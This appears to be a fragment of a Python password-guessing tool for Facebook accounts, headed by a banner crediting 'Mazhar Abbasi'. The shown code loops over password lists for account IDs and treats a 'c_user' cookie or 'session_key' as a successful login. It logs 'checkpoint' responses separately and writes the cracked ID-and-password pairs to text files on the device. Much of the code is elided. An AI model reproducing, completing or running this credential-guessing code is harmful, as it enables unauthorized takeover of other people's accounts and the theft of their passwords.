...
----------------------------------------------
 Github    : Mazhar
 Facebook  : Mazhar Abbasi
 Tool Name : Mazhar badshah
 Type type : Abbasi name to suna hu ga
 Version   : 1.0.0
----------------------------------------------
 Mazhar Pro version 1.0.0
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Veero:
                                ...
                                print('\r\r\033[1;32m [ABBASI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ABBASI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Veero:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ABBASI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABBASI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ABBASI-OK] '+ids+' | '+pas+'\033[1;97m')
